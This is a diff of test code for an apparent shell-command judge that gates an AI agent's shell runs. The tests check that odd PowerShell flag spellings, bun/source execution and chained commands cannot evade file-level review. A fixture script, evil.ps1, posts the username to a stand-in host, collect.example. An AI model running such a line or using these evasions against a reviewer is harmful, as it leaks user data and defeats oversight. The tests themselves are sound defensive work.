@@ -489,3 +489,70 @@ test('P2 の範囲（1 つの決まり）: 中を読めない包み（inner が 
   assert.equal(filesScopeOf([run as never, statement as never], ['code.file_run'], r.ws).kind, 'owner');
   assert.equal(filesScopeOf([run as never], ['code.file_run'], r.ws).kind, 'files');
 });
+
+// 2026-11-26 shell-judge: what filesScope decided for one command: files (the judge gets FILES), owner (nothing to show: the owner decides), or command (the judge sees the command text only)
+const scopeOf = (r: ReturnType<typeof selfRunRig>, command: string): 'files' | 'owner' | 'command' => {
+  const fact = shellPreCheck({ command }, chat(r)).judgeFiles;
+  return fact === undefined ? 'command' : 'problem' in fact ? 'owner' : 'files';
+};
+const SCOPE_SHELLS: Array<'bash' | 'powershell'> = PS ? ['bash', 'powershell'] : ['bash'];
+
+test('A1 powershell・pwsh の -File の綴り違い（-f・-fi・-fil・-FILE・/File・/f・--file）も -File と同じ: filesScope は files で、判定役に x.ps1 の中身が届く。-fo などの別の旗は今のまま（持ち主）', async t => {
+  const files = { 'x.ps1': "Write-Output 'x'\n", 'evil.ps1': "Invoke-RestMethod -Uri 'https://collect.example/x' -Method Post -Body $env:USERNAME\n" };
+  const flags = ['-File', '-f', '-fi', '-fil', '-FILE', '/File', '/f', '--file'];
+  const wrong: string[] = [];
+  for (const shell of SCOPE_SHELLS) {
+    for (const program of ['powershell', 'pwsh']) {
+      const r = selfRunRig(t, c => { c.tools.shell.shell = shell; }, files);
+      const expect = (command: string, want: string) => { const got = scopeOf(r, command); if (got !== want) wrong.push(`${shell}: ${command} -> ${got} (want ${want})`); };
+      for (const flag of flags) { expect(`${program} ${flag} x.ps1`, 'files'); expect(`${program} -NoProfile ${flag} x.ps1`, 'files'); }
+      for (const flag of ['-fo', '-filex', '-ff']) expect(`${program} ${flag} x.ps1`, 'owner');
+    }
+  }
+  assert.deepEqual(wrong, []);
+  for (const flag of flags) {
+    const r = selfRunRig(t, c => { c.tools.shell.shell = 'bash'; }, files);
+    r.judge.answer = ASK;
+    await r.call('shell_run', { command: `powershell ${flag} evil.ps1` }, chat(r));
+    assert.equal(r.judge.calls, 1, `powershell ${flag} evil.ps1`);
+    const p = r.judge.prompts[0]!;
+    assert.ok(section(p, 'FILES').includes(join(r.ws, 'evil.ps1')) && section(p, 'FILES').includes('collect.example') && p.system.includes(CODE_RULE), `powershell ${flag} evil.ps1: FILES and the code rule`);
+  }
+  const outside = selfRunRig(t, c => { c.tools.shell.shell = 'bash'; }, files);
+  writeFileSync(join(outside.ws, '..', 'out.ps1'), "Write-Output 'x'\n");
+  await ownerOnly(outside, 'powershell -fi ../out.ps1', 'judge_failed');
+});
+
+test('A2 実行を数え漏らさない: bun の <file>・source・. は実行に数える。道具と一緒の文（npx tsx x; bun evil.ts など）は持ち主。bun test・run・x は道具のまま、bun だけ・source だけは今までどおり持ち主', async t => {
+  const files = { 'evil.ts': EVIL, 'run.ts': "console.log('run');\n", 'evil.sh': 'echo hi\n', 'evil.ps1': "Write-Output 'x'\n", 'package.json': '{}' };
+  const owner = ['npm -v; bun evil.ts', 'npm -v; . ./evil.sh', 'source evil.sh; npx tsx run.ts', '. ./evil.ps1; npx tsx run.ts', 'npx tsx run.ts; bun evil.ts', 'npm test; bun evil.ts', 'bun evil.ts; npm test',
+    'bun test; bun evil.ts', 'source evil.sh; npm test', 'npm test; . ./evil.sh', 'sh -c "npm test; bun evil.ts"', 'bun evil.ts', 'bun --bun evil.ts', 'source evil.sh', '. ./evil.sh'];
+  const command = ['bun test', 'bun run build', 'bun x tsc', 'bun --version', 'bun -v; npm test', 'npm -v; bun --version', 'npx tsx run.ts', 'npm test'];
+  const shown = ['node run.ts; npm -v', 'node run.ts'];
+  const wrong: string[] = [];
+  for (const shell of SCOPE_SHELLS) {
+    const r = selfRunRig(t, c => { c.tools.shell.shell = shell; }, files);
+    for (const [want, list] of [['owner', owner], ['command', command], ['files', shown]] as const) wrong.push(...list.filter(c => scopeOf(r, c) !== want).map(c => `${shell}: ${c} -> ${scopeOf(r, c)} (want ${want})`));
+  }
+  assert.deepEqual(wrong, []);
+  for (const c of ['source evil.sh; npx tsx run.ts', 'npx tsx run.ts; bun evil.ts', 'npm test; bun evil.ts']) await ownerOnly(selfRunRig(t, cfg => { cfg.tools.shell.shell = 'bash'; }, files), c, 'judge_failed');
+});
+
+// 2026-11-26 shell-judge (security review, MEDIUM): a powershell statement is never a test runner, whatever flags it carries. `--test` before -File must not make it quiet for rewritesOf
+test('A1 再審査: powershell・pwsh は --test があっても試験の道具に数えない。-File の前の --test でも、前の文が書き換えるかの確かめ（持ち主）は変わらない', async t => {
+  const files = { 'x.ps1': "Write-Output 'x'\n", 't.js': "console.log('t');\n" };
+  const wrong: string[] = [];
+  for (const shell of SCOPE_SHELLS) {
+    const r = selfRunRig(t, c => { c.tools.shell.shell = shell; }, files);
+    for (const program of ['powershell', 'pwsh']) {
+      for (const flag of ['-File', '-fi', '-fil', '/File', '/f', '--file']) {
+        for (const command of [`${program} --test ${flag} x.ps1; node --test t.js`, `${program} --test ${flag} x.ps1; node t.js`]) {
+          const got = scopeOf(r, command);
+          if (got !== 'owner') wrong.push(`${shell}: ${command} -> ${got} (want owner)`);
+        }
+      }
+    }
+  }
+  assert.deepEqual(wrong, []);
+  await ownerOnly(selfRunRig(t, c => { c.tools.shell.shell = 'bash'; }, files), 'powershell --test -fi x.ps1; node --test t.js');
+});
